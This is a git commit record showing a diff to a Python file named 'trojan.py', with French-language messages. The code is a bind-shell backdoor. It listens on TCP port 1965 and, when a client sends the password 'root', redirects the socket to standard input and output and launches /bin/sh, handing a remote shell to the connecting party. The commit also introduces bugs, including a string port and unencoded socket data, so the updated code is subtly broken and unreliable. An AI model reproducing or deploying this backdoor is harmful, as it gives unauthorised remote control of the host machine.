26c3447ded7a9fd4c3fe4fb2e0577b33b70cd2fb
KillerTheBee <61102077+KillerTheBee@users.noreply.github.com>
2020-06-03 16:20:07 -0400

    Update trojan.py

--- trojan.py
+++ trojan.py
@@ -3,28 +3,27 @@ import os
 import code
 
 host = ""
-port = 1965
+port = "1965"
 mot = ""
 
+print(socket.gethostbyname(socket.gethostname()))
 print("Creation du socket en cours...")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print("Creation du socket terminee !")
 s.bind((host, port))
-print("Lancement de l'ecoute...")
+print("Lancement de l'écoute")
 s.listen(1)
-client, adresse = s.accept()
+client,adresse = s.accept()
 print(adresse)
 print(client.getpeername())
-client.send("Bonjour Karax : ".encode("utf-8"))
+client.send("Bonjour Karax : ")
 mot = client.recv(1024)
-root = "root\n".encode("utf-8")
-print(root)
+root = "root\n"
 print(mot)
 while(1):
 	if (mot == root):
-		print("On est dans root")
+		print("On est dans root ! ")
 		for f in range(3):
-			print(f)
 			os.dup2(client.fileno(), f)
 		os.execl("/bin/sh", "/bin/sh")
 		code.interact()
